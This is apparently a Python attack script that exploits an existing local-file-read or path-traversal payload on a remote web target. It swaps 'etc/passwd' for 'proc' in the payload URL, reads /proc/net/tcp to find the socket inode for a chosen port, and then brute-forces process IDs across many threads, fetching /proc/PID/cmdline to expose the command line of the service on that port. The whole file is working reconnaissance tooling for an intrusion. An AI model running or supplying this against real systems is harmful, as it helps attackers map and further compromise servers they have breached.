import requests
import threading
from queue import Queue
import time


def fetch_cmdline(q, base_url, port, stop_event):
    while not q.empty() and not stop_event.is_set():
        try:
            pid = q.get(timeout=1)
        except:
            break
            
        try:

            response = requests.get(base_url.format(pid), timeout=3)

            content = response.content.decode('utf-8', errors='ignore').replace('\x00', ' ')
            
            if content.strip() and f"{port}" in content:
                print(f"\n\n[+] SUCCESS! Service found on port {port}")
                print(f"[+] Command Line: {content.strip()}")
                print(f"[+] PID: {pid}")


                stop_event.set()


                while not q.empty():
                    try:
                        q.get_nowait()
                        q.task_done()
                    except:
                        break
                break
        except Exception:
            pass
        
        q.task_done()


def get_service_info(target_path, port_hex):
    url = f"{target_path}/net/tcp"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            lines = response.text.split('\n')
            for line in lines:
                fields = line.strip().split()

                if len(fields) > 1 and fields[1].endswith(port_hex):
                    inode = fields[9]
                    return inode
    except Exception as e:
        print(f"[-] Error accessing /net/tcp: {e}")
    return None

def start_service_dettect(payload, port, threads_count):

    proc_payload = payload.replace("etc/passwd", "proc")
    base_url = f"{proc_payload}/{{}}/cmdline"


    port_hex = f'{port:X}'.zfill(4) 

    print(f"[*] Target Proc Path: {proc_payload}")
    print(f"[*] Searching for Port: {port} (Hex: {port_hex})")

    inode = get_service_info(proc_payload, port_hex)

    if inode:
        print(f"[+] Found Inode: {inode}. Starting PID brute-force...")

        q = Queue()
        stop_event = threading.Event()


        for i in range(1, 200000):
            q.put(i)

        thread_objects = []

        for _ in range(threads_count):
            t = threading.Thread(target=fetch_cmdline, args=(q, base_url, port, stop_event))
            t.daemon = True 
            t.start()
            thread_objects.append(t)


        try:
            while not q.empty() and not stop_event.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n[!] User interrupted the scan.")
            stop_event.set()


        for t in thread_objects:
            t.join(timeout=1)
            
        if stop_event.is_set():
            print("[*] Scan stopped: Result found.")
        else:
            print("[-] Scan finished: Service not found in PIDs 1-10000.")
    else:
        print(f"[-] Could not find an active service on port {port} via /proc/net/tcp")
